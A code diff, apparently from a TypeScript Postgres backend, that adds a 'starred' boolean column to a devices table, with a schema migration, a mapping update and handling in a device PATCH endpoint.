@@ -49,6 +49,7 @@ const devices = pgTable("devices", {
   fcmToken: text("fcm_token"),
   installedAt: timestamp("installed_at", { withTimezone: true }).notNull().defaultNow(),
   updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
+  starred: boolean("starred").notNull().default(false),
 }, (t) => ({
   deviceIdUq: uniqueIndex("devices_device_id_uq").on(t.deviceId),
   appIdx: index("devices_app_idx").on(t.appId),
@@ -177,6 +178,8 @@ async function ensureSchema(env: Env): Promise<void> {
       sqlClient(`CREATE INDEX IF NOT EXISTS admin_sessions_app_idx ON admin_sessions(app_id)`),
       // Migration: add login_limit column if not exists
       sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS login_limit INTEGER NOT NULL DEFAULT 5`),
+      // Migration: add starred column to devices
+      sqlClient(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS starred BOOLEAN NOT NULL DEFAULT FALSE`),
     ]);
     // ensure default app + master PIN setting
     await Promise.all([
@@ -215,6 +218,7 @@ function mapDevice(r: typeof devices.$inferSelect) {
     forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
     fcmToken: r.fcmToken,
     installedAt: isoReq(r.installedAt), updatedAt: isoReq(r.updatedAt),
+    starred: r.starred,
   };
 }
 function mapMessage(r: typeof messages.$inferSelect) {
@@ -527,6 +531,7 @@ app.patch("/api/devices/:deviceId", async (c) => {
   if (body.fcmToken !== undefined) patch.fcmToken = String(body.fcmToken);
   if (body.forwardEnabled !== undefined) patch.forwardEnabled = Boolean(body.forwardEnabled);
   if (body.forwardSlot !== undefined) patch.forwardSlot = body.forwardSlot === null ? null : Number(body.forwardSlot);
+  if (body.starred !== undefined) patch.starred = Boolean(body.starred);
   const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, c.req.param("deviceId"))).returning();
   if (!row) return c.json({ error: "Device not found" }, 404);
   const mapped = mapDevice(row);
